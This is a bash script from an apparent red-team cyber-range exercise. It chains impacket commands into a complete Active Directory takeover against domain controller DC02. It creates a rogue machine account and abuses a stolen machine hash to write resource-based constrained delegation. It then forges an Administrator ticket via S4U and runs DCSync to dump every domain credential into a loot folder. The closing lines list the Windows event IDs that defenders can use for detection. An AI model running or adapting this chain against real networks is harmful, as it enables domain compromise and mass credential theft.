#!/bin/bash
# ============================================================
# TTP5: RBCD Abuse → S4U → Domain Admin → DCSync
# MITRE: T1098 — Account Manipulation
# MITRE: T1003.006 — OS Credential Dumping: DCSync
# APT29 Ref: NOBELIUM — delegation/trust attribute modification
# ============================================================
# PURPOSE: Generates Event 4741 (computer account creation),
#          Event 5136 (DS object modified — RBCD attribute),
#          Event 4769 (S4U TGS), Event 4624 DA logon on DC02.
# RUN FROM: Kali (attacker machine)
# PREREQ: SRV07-SQL$ machine hash from TTP4, svc_web password
# ============================================================

set -o pipefail
DOMAIN="cyberange.local"
TOOLS="/opt/redteam"
LOOT="$TOOLS/loot"
DC_HOST="DC02.$DOMAIN"
MACHINE_HASH="${1:?Usage: $0 <SRV07_MACHINE_HASH> <DC_IP>}"
DCIP="${2:?Usage: $0 <SRV07_MACHINE_HASH> <DC_IP>}"
SVC_WEB_PASS="${3:-Summer2025!}"

echo "[*] TTP5: RBCD Abuse → Domain Admin — T1098 / T1003.006"
echo "[*] Target: $DC_HOST"
echo ""

# Sync clock
dc_time=$(nmap -p 445 --script smb2-time "$DCIP" 2>/dev/null | grep "date:" | grep -oP '\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}' | head -1)
[ -n "$dc_time" ] && sudo date -s "$dc_time" &>/dev/null && echo "[+] Clock synced: $dc_time"

cd "$TOOLS"

echo ""
echo "[*] Phase 1: Enumerating ACLs on DC02 computer object..."
echo ""
impacket-dacledit "$DOMAIN/svc_web:$SVC_WEB_PASS" \
  -dc-ip "$DCIP" -target 'DC02$' -action read 2>&1 | tee "$LOOT/ttp5_acl_read.txt"
sleep 2

echo ""
echo "[*] Phase 2: Creating machine account COMP\$..."
echo "[*] MachineAccountQuota=10 allows any authenticated user to create up to 10 computer accounts"
echo ""
impacket-addcomputer "$DOMAIN/svc_web:$SVC_WEB_PASS" \
  -computer-name 'COMP$' -computer-pass 'FakeP@ss123!' \
  -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp5_addcomputer.txt"
sleep 2

echo ""
echo "[*] Phase 3: Writing RBCD on DC02 using SRV07-SQL\$ GenericWrite..."
echo "[*] Modifying msDS-AllowedToActOnBehalfOfOtherIdentity"
echo ""
impacket-rbcd "$DOMAIN/SRV07-SQL\$" \
  -hashes ":$MACHINE_HASH" \
  -delegate-to 'DC02$' \
  -delegate-from 'COMP$' \
  -action write -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp5_rbcd_write.txt"
sleep 2

echo "[*] Verifying RBCD attribute..."
impacket-rbcd "$DOMAIN/SRV07-SQL\$" \
  -hashes ":$MACHINE_HASH" \
  -delegate-to 'DC02$' \
  -action read -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp5_rbcd_verify.txt"
sleep 2

echo ""
echo "[*] Phase 4: S4U — COMP\$ impersonates Administrator on CIFS/DC02..."
echo ""
rm -f *.ccache 2>/dev/null
unset KRB5CCNAME

impacket-getST "$DOMAIN/COMP\$:FakeP@ss123!" \
  -spn "CIFS/$DC_HOST" \
  -impersonate Administrator \
  -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp5_s4u_da.txt"

DA_CCACHE=$(ls -t *.ccache 2>/dev/null | head -1)
if [ -n "$DA_CCACHE" ]; then
    export KRB5CCNAME="$DA_CCACHE"
    echo "[+] DA ticket: $DA_CCACHE"
else
    echo "[-] S4U failed. Trying with -altservice..."
    impacket-getST "$DOMAIN/COMP\$:FakeP@ss123!" \
      -spn "CIFS/$DC_HOST" \
      -impersonate Administrator \
      -altservice "CIFS/$DC_HOST" \
      -dc-ip "$DCIP" 2>&1 | tee -a "$LOOT/ttp5_s4u_da.txt"

    DA_CCACHE=$(ls -t *.ccache 2>/dev/null | head -1)
    [ -n "$DA_CCACHE" ] && export KRB5CCNAME="$DA_CCACHE" && echo "[+] DA ticket: $DA_CCACHE"
fi
sleep 2

echo ""
echo "[*] Phase 5: Verifying Domain Admin on DC02..."
echo ""
impacket-wmiexec -k -no-pass "$DOMAIN/Administrator@$DC_HOST" \
  'whoami && hostname && net group "Domain Admins" /domain' 2>&1 | tee "$LOOT/ttp5_da_verify.txt"
sleep 2

echo ""
echo "[*] Phase 6: DCSync — dumping ALL domain credentials..."
echo "[*] This replicates NTDS.dit via MS-DRSR"
echo ""
impacket-secretsdump -k -no-pass "$DOMAIN/Administrator@$DC_HOST" 2>&1 | tee "$LOOT/ttp5_dcsync.txt"

HASH_COUNT=$(grep -ac ":::" "$LOOT/ttp5_dcsync.txt" 2>/dev/null)
echo ""
echo "[+] Extracted $HASH_COUNT credential entries."

echo ""
echo "[+] TTP5 Complete. DOMAIN FULLY COMPROMISED."
echo "[+] Blue team: check DC02 Security log for:"
echo "    - Event 4741 — New computer account 'COMP\$' created"
echo "    - Event 5136 — msDS-AllowedToActOnBehalfOfOtherIdentity modified on DC02 object"
echo "    - Event 4769 — S4U TGS request from COMP\$ impersonating Administrator"
echo "    - Event 4624 Type 3 — Administrator logon from attacker IP"
echo "    - Event 4662 — Directory service object access (DCSync replication)"
echo "[+] Artifacts: $LOOT/ttp5_*"
